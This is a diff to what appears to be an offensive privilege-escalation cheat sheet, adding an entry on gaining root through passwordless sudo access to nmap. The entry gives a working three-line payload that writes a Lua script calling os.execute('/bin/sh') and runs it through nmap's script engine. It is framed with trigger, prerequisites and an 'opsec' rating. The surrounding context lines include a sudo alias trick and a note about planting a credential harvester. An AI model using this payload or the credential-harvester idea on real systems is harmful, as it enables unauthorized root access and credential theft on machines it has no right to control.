@@ -205,3 +205,17 @@ cat /proc/sys/kernel/yama/ptrace_scope
 echo 'alias sudo="sudo "'  >> ~/.bashrc  # Ensures alias expansion
 # Or plant a credential harvester (opsec: high)
 ```
+
+### nmap --script Lua os.execute PrivEsc [added: 2026-04]
+- **Tags:** #Sudo #nmap #GTFOBins #PrivEsc #Lua #ScriptEngine
+- **Trigger:** `sudo -l` shows `(root) NOPASSWD: /usr/bin/nmap`
+- **Prereq:** Shell as non-root user; nmap sudoable without password
+- **Yields:** Root shell via nmap Lua NSE script engine
+- **Opsec:** Low
+- **Context:** Zabbix, monitoring agents, and other services may grant nmap sudo for host detection. The NSE Lua engine runs as the sudo user.
+- **Payload/Method:**
+  ```bash
+  TF=$(mktemp)
+  echo 'os.execute("/bin/sh")' > $TF
+  sudo nmap --script=$TF
+  ```
